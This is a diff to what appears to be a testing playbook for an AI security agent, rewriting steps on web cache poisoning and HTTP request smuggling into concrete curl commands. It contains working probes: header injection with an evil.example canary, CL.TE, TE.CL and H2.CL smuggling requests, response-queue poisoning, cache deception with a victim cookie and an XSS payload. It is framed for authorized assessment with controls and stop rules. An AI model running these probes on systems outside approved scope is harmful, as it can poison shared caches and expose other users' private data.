@@ -13,105 +13,152 @@ Approved `host` only. Every command via `cyber_process` `argv`. One probe per re
 
 ## Steps
 
-### 1. Cache detection
+### 1. Cache detection — positive control
 
-Identify if the target uses a cache:
-- Check headers: `X-Cache`, `CF-Cache-Status`, `Age`, `X-Cache-Hits`, `Vary`
-- Send the same request twice → check if second is faster or has `X-Cache: HIT`
-- Identify cache key: usually `Host + Path + Query` (but not always)
-- Identify CDN: Cloudflare, Akamai, Fastly, CloudFront, Varnish
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/?cb=BASELINE-001"]
+```
+
+Record `X-Cache`, `CF-Cache-Status`, `Age`, `X-Cache-Hits`, `Vary`, `Server`. Send the same request again:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/?cb=BASELINE-001"]
+```
+
+If the second response shows `X-Cache: HIT`, `Age > 0`, or `CF-Cache-Status: HIT` → cache confirmed. Record the CDN fingerprint (Cloudflare, Akamai, Fastly, CloudFront, Varnish). Hash both responses.
 
 ### 2. Unkeyed input discovery
 
-For each header/parameter, check if it's reflected but NOT in the cache key:
-| Input | Test |
-|---|---|
-| `X-Forwarded-Host` | `X-Forwarded-Host: evil.com` → reflected in `<link>`, `<script src>`? |
-| `X-Forwarded-Scheme` | `X-Forwarded-Scheme: http` → redirect loop? |
-| `X-Original-URL` | `X-Original-URL: /admin` → path override? |
-| `X-Forwarded-Port` | Port reflected in URLs? |
-| Cookie values | Specific cookie reflected but not in cache key? |
-| `Accept-Language` | Language reflected without Vary? |
-| Unkeyed query params | `?utm_content=<script>` reflected? |
-
-Method: add a cache-buster (`?cb=random`), inject the header, request twice. If the second request (without the header) shows the injected value → cache poisoned.
-
-### 3. Cache key normalization
-
-Test differences between how the cache and the origin normalize the key:
-- Path: `/api/..%2fadmin` vs `/api/../admin`
-- Query: `?a=1&a=2` (parameter pollution)
-- Fragment: `#fragment` (some caches strip, some don't)
-- Case: `/Admin` vs `/admin`
-- Encoding: `%61dmin` vs `admin`
-
-### 4. HTTP request smuggling
-
-#### CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)
-```
-POST / HTTP/1.1
-Host: target
-Content-Length: 13
-Transfer-Encoding: chunked
-
-0
-
-SMUGGLED
-```
-
-#### TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length)
-```
-POST / HTTP/1.1
-Host: target
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
+For each probe, use a unique cache-buster. Inject the header, then request without it:
 
 ```
-
-#### H2.CL (HTTP/2 front-end, HTTP/1.1 back-end)
-```
-:method POST
-:path /
-content-length: 0
-
-GET /admin HTTP/1.1
-Host: target
+cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Host: canary-xfh.evil.example","<url>/?cb=XFH-001"]
 ```
 
-Detection:
-- Time-based: smuggled request causes a delay in the next response
-- Response-based: next legitimate request receives the smuggled response
-- Use `smuggler.py` or `http2smugl` for automated detection
+```
+cyber_process argv=["curl","-sS","<url>/?cb=XFH-001"]
+```
 
-### 5. Response queue poisoning
+If the second response (no injected header) reflects `canary-xfh.evil.example` in a `<link>`, `<script src>`, or `Location` → cache poisoned via unkeyed `X-Forwarded-Host`.
 
-If smuggling is confirmed:
-1. Smuggle a request to a sensitive endpoint (`/admin`, `/api/user`)
-2. The next legitimate user's response contains the smuggled response
-3. Prove with a canary: smuggle a request that reflects a unique token
+Repeat for each vector:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Scheme: nothttps","<url>/?cb=XFS-001"]
+cyber_process argv=["curl","-sS","-D","-","-H","X-Original-URL: /admin","<url>/?cb=XOU-001"]
+cyber_process argv=["curl","-sS","-D","-","-H","X-Forwarded-Port: 1337","<url>/?cb=XFP-001"]
+```
+
+Then fetch each `?cb=` without the header to check cached reflection.
+
+| Vector | Inject | Reflected where | Impact |
+|---|---|---|---|
+| `X-Forwarded-Host` | `evil.example` | `<link>`, `<script src>`, redirect | XSS via poisoned script import |
+| `X-Forwarded-Scheme` | `nothttps` | redirect `Location` | redirect loop / downgrade |
+| `X-Original-URL` | `/admin` | path override | access control bypass |
+| `X-Forwarded-Port` | `1337` | URL generation | broken links / open redirect |
+| Unkeyed query param | `utm_content=<img+onerror=alert(1)>` | body | stored XSS via cache |
+
+### 3. Cache key normalization probes
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/api/..%2fadmin"]
+cyber_process argv=["curl","-sS","-D","-","<url>/api/../admin"]
+```
+
+If both return the same resource but only one is cached → normalization gap. Also test:
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/Admin"]
+cyber_process argv=["curl","-sS","-D","-","<url>/%61dmin"]
+```
+
+Compare status, body, and cache headers across variants.
+
+### 4. HTTP request smuggling — CL.TE detection
+
+Use a time-based probe. If the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding`, a smuggled partial request causes the next request to stall:
+
+```
+cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: 6","-H","Transfer-Encoding: chunked","-d","0\r\n\r\nG","<url>/"]
+```
+
+Immediately send a normal request:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-o","/dev/null","-w","time:%{time_total} status:%{http_code}","<url>/"]
+```
+
+If the follow-up stalls (>5s) or returns an unexpected status → CL.TE desync candidate. Three samples confirm timing-based detection.
+
+For TE.CL, reverse the conflict:
+
+```
+cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: 3","-H","Transfer-Encoding: chunked","-d","8\r\nSMUGGLED\r\n0\r\n\r\n","<url>/"]
+```
+
+For H2.CL (HTTP/2 front-end), use `h2csmuggler` or raw `nghttp`:
+
+```
+cyber_process argv=["python3","-m","h2csmuggler","-x","<url>/","--smuggle","GET /admin HTTP/1.1\r\nHost: <host>\r\n\r\n"]
+```
+
+### 5. Response queue poisoning — canary proof
+
+If smuggling is confirmed, inject a request that reflects a unique canary:
+
+```
+cyber_process argv=["curl","-sS","-D","-","--http1.1","-X","POST","-H","Content-Length: <calculated>","-H","Transfer-Encoding: chunked","-d","0\r\n\r\nGET /canary-UNIQUE-ID HTTP/1.1\r\nHost: <host>\r\nFoo: bar","<url>/"]
+```
+
+Then send a normal request. If the response contains `/canary-UNIQUE-ID` or a 404 for that path → the smuggled request was processed by the back-end and its response was served to the next client.
 
 ### 6. Cache deception
 
-Reverse of poisoning — trick the cache into storing a victim's private response:
-- `GET /account/settings.css` (non-existent, but cache stores the HTML response)
-- `GET /account/settings/..%2f..%2fstatic/style.css` (path confusion)
-- If the cache stores the authenticated response under a public key → credential exposure
+Trick the cache into storing a private page under a public-looking path:
+
+```
+cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <victim-session>","<url>/account/settings/nonexistent.css"]
+```
+
+```
+cyber_process argv=["curl","-sS","-D","-","<url>/account/settings/nonexistent.css"]
+```
+
+If the second (unauthenticated) request returns the victim's settings HTML → cache deception confirmed.
 
 ### 7. Negative controls
 
-- Control 1: normal request → cached normally (positive control)
-- Control 2: unkeyed header with no reflection → no poisoning
-- Control 3: properly keyed input → cache varies correctly
-- Control 4: for smuggling, a well-formed request → no desync
+| Control | Probe | Expected |
+|---|---|---|
+| Normal cache | same `?cb=` twice, no injection | `HIT` on second, no foreign content |
+| Non-reflected header | `X-Custom-Nothing: test` | not reflected, cache clean |
+| Keyed input | `Vary: Accept-Language` present | different `Accept-Language` → different cache entry |
+| Well-formed request | normal POST | no desync on follow-up |
 
-## Proof contract
+### Stop
 
-A finding needs: (1) identified cache/proxy infrastructure, (2) demonstrated poisoning or smuggling with a canary, (3) a second request receiving the poisoned/smuggled response, (4) reproduction, (5) four negative controls. A reflected unkeyed header is a lead — cached reflection is a finding.
+Production-shared caches, sustained smuggling, payload that modifies server state.
+
+### Evidence ids
+
+Keep cache-baseline, each unkeyed-header probe (inject + verify), normalization probes, smuggling timing samples (3 each), queue-poisoning canary, deception probe, and all controls as separate observations. Record `X-Cache`, `Age`, `CF-Cache-Status`, body hash.
+
+## Verification scenarios
+
+| Scenario | Observation | Expected classification |
+|---|---|---|
+| `X-Forwarded-Host` reflected in cached response without header | body contains `evil.example` on clean fetch | cache poisoning candidate |
+| `X-Forwarded-Host` not reflected | clean response | negative control confirmed |
+| CL.TE follow-up stalls >5s, 3 samples | consistent timing | CL.TE smuggling candidate |
+| CL.TE follow-up returns immediately | normal timing | no desync |
+| Deception: unauthenticated fetch returns victim HTML | private fields in body | cache deception candidate |
+| Deception: unauthenticated fetch returns 404 | no private data | negative control confirmed |
+| Smuggled canary appears in next response | canary path in body | queue poisoning candidate |
+| Unkeyed `utm_content` with script tag cached | `<img onerror=` in clean fetch | stored XSS via cache |
+
+A reflected unkeyed header is a lead. The finding is the **cached** reflection served to a second, clean request.
 
 ## Done
 
-Each finding cites the cache infrastructure, the unkeyed input or desync technique, the cached/smuggled proof, and the negative controls.
+`cyber_finding` cites the CDN, the unkeyed input or desync technique, the cached proof (inject → clean fetch), and all controls. Untested vectors stay `not-tested`.
